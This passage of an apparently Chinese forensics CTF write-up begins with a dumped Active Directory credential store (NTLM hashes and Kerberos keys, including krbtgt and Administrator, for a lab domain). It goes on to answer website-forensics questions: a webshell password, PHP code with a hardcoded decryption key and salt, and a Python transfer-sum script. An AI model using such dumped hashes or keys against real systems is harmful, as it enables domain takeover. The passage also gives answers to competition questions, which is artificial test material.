test.local\HealthMailbox5df812c_history18:1139:aad3b435b51404eeaad3b435b51404ee:6ee9d43393d4f30bf92c88f27571105a:::
test.local\HealthMailbox5df812c_history19:1139:aad3b435b51404eeaad3b435b51404ee:d2f30d1ab08574c2697a4596c55d5254:::
test.local\HealthMailbox5df812c_history20:1139:aad3b435b51404eeaad3b435b51404ee:c9a5d166b9790e5371105aa013b1165b:::
test.local\HealthMailbox5df812c_history21:1139:aad3b435b51404eeaad3b435b51404ee:e23674dea3a697e21f8c800a0e81d4ad:::
test.local\HealthMailbox5df812c_history22:1139:aad3b435b51404eeaad3b435b51404ee:0cf28552d306144935f688187d53cfa1:::
test.local\HealthMailbox3b3738b:1140:aad3b435b51404eeaad3b435b51404ee:5ae4cbd737c56ae1200e27f1613152ef:::
test.local\HealthMailbox92ad4b5:1141:aad3b435b51404eeaad3b435b51404ee:8a72893d2524ec7250665dc774309ef0:::
test.local\HealthMailbox32c7bf8:1142:aad3b435b51404eeaad3b435b51404ee:a6da9aacd86610c09b8092fc80b828d0:::
test.local\HealthMailbox57b62f5:1143:aad3b435b51404eeaad3b435b51404ee:32fa33f6fce1c88d17b0f2461ddc14bf:::
test.local\HealthMailbox18342c7:1144:aad3b435b51404eeaad3b435b51404ee:0ac5b6fd8216905ce1bf6c8728a03eac:::
test.local\HealthMailbox2d4e04f:1145:aad3b435b51404eeaad3b435b51404ee:42b6fb14d0650f80148d5a20dc12f77e:::
test.local\HealthMailbox247d46e:1146:aad3b435b51404eeaad3b435b51404ee:d403e27a987b8bc0e56c74ea4b337d09:::
test.local\HealthMailbox364422e:1147:aad3b435b51404eeaad3b435b51404ee:38716e3d1eabfc27eeffc559d0dffbef:::
test.local\HealthMailboxd9284e9:1148:aad3b435b51404eeaad3b435b51404ee:a355b106550b9ac7871ed534b101a1f6:::
test1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::
test1_history0:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::
test1_history1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::
test1_history2:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::
test1_history3:1149:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SDC$:1151:aad3b435b51404eeaad3b435b51404ee:9f40caf799bf0d110fdf08b3bf3eb6c0:::
SDC$_history0:1151:aad3b435b51404eeaad3b435b51404ee:8f3cfaf7a6290b735bcbba5b60d554d4:::
SDC$_history1:1151:aad3b435b51404eeaad3b435b51404ee:7bfe440904b9611776477b85eea398fc:::
testnew$:1152:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::
WIN-PJ6ELFEG09P$:1153:aad3b435b51404eeaad3b435b51404ee:6533cba50e01cace16567ec5691e587f:::
testcomputer$:1154:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::
t$:1155:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::
tt$:1156:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::
WebApp01$:1157:aad3b435b51404eeaad3b435b51404ee:b021fa4e92913d91a6eade97884f508b:::
aaa:1158:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
[*] Kerberos keys from ./ntds.dit 
test.local\Administrator:aes256-cts-hmac-sha1-96:bf735a3948b1284821574a0044a703548465e61057dd1a7768325e8aad06ae5e
test.local\Administrator:aes128-cts-hmac-sha1-96:bd93e3242d1a346f4d2280ac3c33f965
test.local\Administrator:des-cbc-md5:1f4cef4cabf20298
Admin:aes256-cts-hmac-sha1-96:f3ee9e3911e4dcbd686dc73b2a70c6d7762fff9ffeb304d62410b5f2464a5884
Admin:aes128-cts-hmac-sha1-96:40877736a0a837a3b9563fd4f12e72f5
Admin:des-cbc-md5:cddcea70e6a4c29d
test:aes256-cts-hmac-sha1-96:3a4b7dc7e441d73726adbb1921e79ba65a8895d74887e04df9eaef3869207ee9
test:aes128-cts-hmac-sha1-96:98bf9049e7f51e8e7d8f461aa8d9ec70
test:des-cbc-md5:e3986db31051c154
PDC$:aes256-cts-hmac-sha1-96:3a1cff1c3cbbc08e6c4014cc629f2a3d8a31b6dec5759f6f0859d0bfe6506182
PDC$:aes128-cts-hmac-sha1-96:05de7789ce4233c3fb1117b864cd8644
PDC$:des-cbc-md5:9dadcb61688a2367
krbtgt:aes256-cts-hmac-sha1-96:ce69418e93cd64b771e562ac73ae00b9922fe6c83fa1e82219400e2bb48ed400
krbtgt:aes128-cts-hmac-sha1-96:319f7c87ba483f25f5e4f7b2ee0cf6c1
krbtgt:des-cbc-md5:8a264ad932f23704
EXCHANGE$:aes256-cts-hmac-sha1-96:7998677a5c8ad1934b5a6043b9ffb4e7141412fce5a82358164d26b0b4b0d96a
EXCHANGE$:aes128-cts-hmac-sha1-96:258731ffd04a5d78912db56def015af5
EXCHANGE$:des-cbc-md5:0d10f88043bff491
test.local\HealthMailbox2b984a7:aes256-cts-hmac-sha1-96:2e2c606999ae65c838190eb3e42f268ff2c9e05b562057f4372052e5c418b141
test.local\HealthMailbox2b984a7:aes128-cts-hmac-sha1-96:d496728ddbcd54d5246033fc1e59b191
test.local\HealthMailbox2b984a7:des-cbc-md5:6423fe5eb3b354ce
test.local\HealthMailbox5df812c:aes256-cts-hmac-sha1-96:c7b35baa2d7c75dd729061c98a91262c674068ab46767da9549aa5bc9e0800c7
test.local\HealthMailbox5df812c:aes128-cts-hmac-sha1-96:4c60e6d2265f79ba7578d9e27479dfbf
test.local\HealthMailbox5df812c:des-cbc-md5:b94cb3ba0d927691
test.local\HealthMailbox3b3738b:aes256-cts-hmac-sha1-96:6b463387e784265bde6ea1a73c553d6e8cfe12b22fb1fe0439dd4ccba6784306
test.local\HealthMailbox3b3738b:aes128-cts-hmac-sha1-96:a36192139b393b469db8ecc4401bb5ba
test.local\HealthMailbox3b3738b:des-cbc-md5:ad43043d623eb040
test.local\HealthMailbox92ad4b5:aes256-cts-hmac-sha1-96:2a757f18b3b8d02f9980f9dda081a524e865b2d3a531dcb3c5c146e1cbd7d55a
test.local\HealthMailbox92ad4b5:aes128-cts-hmac-sha1-96:968429cdd9464bcf9e0fde47b136447d
test.local\HealthMailbox92ad4b5:des-cbc-md5:4683e34ca74af710
test.local\HealthMailbox32c7bf8:aes256-cts-hmac-sha1-96:e95d8fd1c2920c19722892bf5e8dfa8846360994f4484c043b04eff000ecd14e
test.local\HealthMailbox32c7bf8:aes128-cts-hmac-sha1-96:1d61443a6254596bd8fb3d697221d710
test.local\HealthMailbox32c7bf8:des-cbc-md5:ef8a4f203e808501
test.local\HealthMailbox57b62f5:aes256-cts-hmac-sha1-96:1713fdd614d9cd173c0b2a54db2d52d013c803bf125584db2c3f163aeaf22c03
test.local\HealthMailbox57b62f5:aes128-cts-hmac-sha1-96:9390dcff5cc2227274a7148e798d0174
test.local\HealthMailbox57b62f5:des-cbc-md5:460d98a4204ab6f2
test.local\HealthMailbox18342c7:aes256-cts-hmac-sha1-96:887d6b5d170b1bac1372631e80a32a732d1ea8985239b48297392aa738a95300
test.local\HealthMailbox18342c7:aes128-cts-hmac-sha1-96:7646f506daa562e686d6c2aefc920b16
test.local\HealthMailbox18342c7:des-cbc-md5:3189bfa47c836d4f
test.local\HealthMailbox2d4e04f:aes256-cts-hmac-sha1-96:57afad1952342893df8277fcc66e8424c77fdedf7bcdc5fc10c1b9ad7e54bdf1
test.local\HealthMailbox2d4e04f:aes128-cts-hmac-sha1-96:1934ccdefa73b2d48f007a97f7720743
test.local\HealthMailbox2d4e04f:des-cbc-md5:15c464a7abb36e5e
test.local\HealthMailbox247d46e:aes256-cts-hmac-sha1-96:219f9c118ae6cc7217e0e3545e39e9bdfb6b207e7c91d8f35cad89bd1ec3ea8b
test.local\HealthMailbox247d46e:aes128-cts-hmac-sha1-96:10b8531f9555d0ecfcc7527d7bc90246
test.local\HealthMailbox247d46e:des-cbc-md5:d07525b029cb6d46
test.local\HealthMailbox364422e:aes256-cts-hmac-sha1-96:a96b346f39ace3cf939d1b8baba23d652405183300911133fae1929cd1869d05
test.local\HealthMailbox364422e:aes128-cts-hmac-sha1-96:5f081757425ad99ea78280bbd8102290
test.local\HealthMailbox364422e:des-cbc-md5:20b51cd623efd558
test.local\HealthMailboxd9284e9:aes256-cts-hmac-sha1-96:bbdb9ddc9c2317044a670859428947f69e082457f41f52e40ce8b05ab9cf79d4
test.local\HealthMailboxd9284e9:aes128-cts-hmac-sha1-96:9860afcea4db56c2c1fcf62a3f827e68
test.local\HealthMailboxd9284e9:des-cbc-md5:1aeaba45202a8fd9
test1:aes256-cts-hmac-sha1-96:255dc456b3fb5c7e0a30af8dc9a6848b2a52632df368848fbe3de66af02a4b39
test1:aes128-cts-hmac-sha1-96:79089681b69f42be4a848f5ba97089e9
test1:des-cbc-md5:f7ce86ba13d5974a
SDC$:aes256-cts-hmac-sha1-96:8ae566481e35184fbe4527e7dd1994ef578d1b2193902a0524d2d7eb521fc546
SDC$:aes128-cts-hmac-sha1-96:dbe510adea502b051456ab9b87b3dcc3
SDC$:des-cbc-md5:796d20cb864cda3e
testnew$:aes256-cts-hmac-sha1-96:3cb7277d0b9a55772d676b05b8e4fe1cef5cf2ac2a771b3694f8140cf251ced2
testnew$:aes128-cts-hmac-sha1-96:ff6f396cde3a83d0f92ba5c41c4398db
testnew$:des-cbc-md5:fbd37375d03e8fef
WIN-PJ6ELFEG09P$:aes256-cts-hmac-sha1-96:6ba5adb397e3b0745e8fc99ec1ef760765fabc72db61aac7fa85180b81255bbc
WIN-PJ6ELFEG09P$:aes128-cts-hmac-sha1-96:dd628a4f9010e06d9e28bdfbb05bba8a
WIN-PJ6ELFEG09P$:des-cbc-md5:85cee3a2e5a1a876
testcomputer$:aes256-cts-hmac-sha1-96:5aab1f9bd51d922662b0fb6629d2f19c021d39ce61ce3e1e0e78c30fe262323f
testcomputer$:aes128-cts-hmac-sha1-96:6d63db940d8a6184c819fe28a2bb941b
testcomputer$:des-cbc-md5:19c2a80d6e86c26b
t$:aes256-cts-hmac-sha1-96:2ecec9c280c2b5a9194a188347f574f978effb1a081788d18336008ff6d82301
t$:aes128-cts-hmac-sha1-96:8db3c242e61039c65cc4ec3e718b4f6e
t$:des-cbc-md5:bc15fd7a4fea73ba
tt$:aes256-cts-hmac-sha1-96:5e29f4025707d663a2f01a37be180eb16aefa1922f33746f884f54d3c3659662
tt$:aes128-cts-hmac-sha1-96:fcbe0e3fb7c4115dd587cf399d80ff8b
tt$:des-cbc-md5:8a153467f7dcba92
WebApp01$:aes256-cts-hmac-sha1-96:694654793ec838d03449774b13614c829cb67e098c6f49d54c2d106dd06f36f7
WebApp01$:aes128-cts-hmac-sha1-96:41dbcb4199062f8e5032c7c389f9671b
WebApp01$:des-cbc-md5:3efbe56e9246fb62
aaa:aes256-cts-hmac-sha1-96:fdca7a6a5d3697843ded80744f15a70492b941e5af1e91bf5ebd5f372a3ce6b4
aaa:aes128-cts-hmac-sha1-96:d853c22fb51e8d65f7eb84a07c7b5a9f
aaa:des-cbc-md5:0d572cfe46a41cf1
[*] Cleaning up...
```

从`local\Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:07ab403ab740c1540c378b0f5aaa4087:::`得到flag{07ab403ab740c1540c378b0f5aaa4087}
### 网站取证

>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。

1.请从网站源码中找出木马文件，并提交木马连接的密码。
lanmaobei666

在/runtime/temp文件夹的第一个文件里面可以看到木马的post变量，即为木马连接的密码

2.请提交数据库连接的明文密码。  
KBLT123

在encrypt/encrypt.php的my_encrypt()函数当中可见

```php
<?php
function my_encrypt(){
    $str = 'P3LMJ4uCbkFJ/RarywrCvA==';
    $str = str_replace(array("/r/n", "/r", "/n"), "", $str);
    $key = 'PanGuShi';
    $iv = substr(sha1($key),0,16);
    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,"",MCRYPT_MODE_CBC,"");
    mcrypt_generic_init($td, "PanGuShi", $iv);
    $decode = base64_decode($str);
    $dencrypted = mdecrypt_generic($td, $decode);
    mcrypt_generic_deinit($td);
    mcrypt_module_close($td);
    $dencrypted = trim($dencrypted);
    return $dencrypted;
}
//数据库连接的密码加密函数
```

3.请提交数据库金额加密混淆使用的盐值。  
jyzg123456

在controller的channelorder.php里面可以看到encrypt函数

```php
function encrypt($data, $key = 'jyzg123456')
    {
        $key = md5($key);
        $x  = 0;
        $len = strlen($data);
        $l  = strlen($key);
        $char = '';
        $str = '';
        for ($i = 0; $i < $len; $i++)
        {
            if ($x == $l)
            {
                $x = 0;
            }
            $char .= $key{$x};
            $x++;
        }
        for ($i = 0; $i < $len; $i++)
        {
            $str .= chr(ord($data{$i}) + (ord($char{$i})) % 256);
        }
        return base64_encode($str);
    }
    //key即为salt值
```

4.请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？（需要注意不同币种之间的换算）
15758353.76
张宝的id为3，王子豪的id为5
channelorder.php对money进行了加密处理
将sql文件里的数据筛选出来即可
`$param['money'] = $this->encrypt($param['money']);`

```python
money = [619677,
         381192,
         485632,
         827781,
         944010,
         870430,
         864838,
         659765,
         840888,
         862278,
         959308,
         375606,
         382351,
         600886,
         668715,
         834416,
         786289,
         569887,
         927718,
         734944,
         934225,
         679480,
         953223,
         405953,
         980190,
         230656,
         627978,
         512603,
         227386,
         886700,
         723220,
         672833,
         392757,
         980233,
         477194,
         341676,
         897454,
         558132,
         196594,
         710565,
         852025,
         780278,
         268891,
         939520,
         565792,
         302532,
         275989,
         362937,
         133285,
         122920,
         422750,
         135300,
         749074,
         240723,
         291956,
         994093,
         681733,
         633757,
         706072,
         511209,
         507084,
         434537,
         639097,
         401141,
         695796,
         192908,
         865109,
         372958,
         889941,
         309835,
         785010,
         933275,
         143084,
         967908,
         771339,
         498613,
         619591,
         141964,
         860425,
         651757,
         723147,
         590890,
         432183,
         556558,
         678067,
         973891,
         406772,
         886149,
         822340,
         657058,
         966135,
         589766,
         311949,
         616394,
         214160,
         201001,
         981701,
         914356,
         135514,
         578433,
         683899,
         334341,
         741263,
         138021,
         316098,
         146481,
         485839,
         205327,
         731848,
         428202,
         160504,
         919123,
         818915,
         333834,
         694827,
         511634,
         443100,
         224355,
         955410,
         143577,
         229766,
         470887,
         915854,
         534098,
         714293,
         752857,
         599085,
         949860,
         759455,
         178042,
         308810,
         687866,
         664921,
         529044,
         626792,
         138977,
         278599,
         984190,
         525555,
         994453,
         753228,
         128063,
         978584,
         238634,
         132052,
         724610,
         518820,
         517548,
         753126]
time = ['2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-02',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-03',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-04',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-05',
        '2022-04-06',
        '2022-04-06',
        '2022-04-06',
        '2022-04-06',
        '2022-04-06',
        '2022-04-06',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-07',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-08',
        '2022-04-09',
        '2022-04-09',
        '2022-04-09',
        '2022-04-09',
        '2022-04-09',
        '2022-04-09',
        '2022-04-09',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-10',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-11',
        '2022-04-12',
        '2022-04-12',
        '2022-04-12',
        '2022-04-12',
        '2022-04-12',
        '2022-04-12',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-13',
        '2022-04-14',
        '2022-04-14',
        '2022-04-14',
        '2022-04-14',
        '2022-04-14',
        '2022-04-14',
        '2022-04-14',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-15',
        '2022-04-16',
        '2022-04-16',
        '2022-04-16',
        '2022-04-16',
        '2022-04-16',
        '2022-04-16',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-17',
        '2022-04-18',
        '2022-04-18',
        '2022-04-18',
        '2022-04-18',
        '2022-04-18',
        '2022-04-18']
print(len(time), len(money))  # 检查数据长度是否一致
exchangerate = [(0.04, '2022-04-02'), (0.06, '2022-04-03'), (0.05, '2022-04-04'), (0.07, '2022-04-05'), (0.10, '2022-04-06'), (0.15, '2022-04-07'), (0.17, '2022-04-08'), (0.23, '2022-04-09'),
                (0.22, '2022-04-10'), (0.25, '2022-04-11'), (0.29, '2022-04-12'), (0.20, '2022-04-13'), (0.28, '2022-04-14'), (0.33, '2022-04-15'), (0.35, '2022-04-16'), (0.35, '2022-04-17'), (0.37, '2022-04-18')]
def get_exchange_rate(date):
    for i in range(len(exchangerate)):
        if exchangerate[i][1] == date:
            return exchangerate[i][0]
    return 'false'
sum = 0
for i in range (len(money)):
    print(money[i], get_exchange_rate(time[i]))
    sum += get_exchange_rate(time[i]) * money[i]
    print(sum)
```
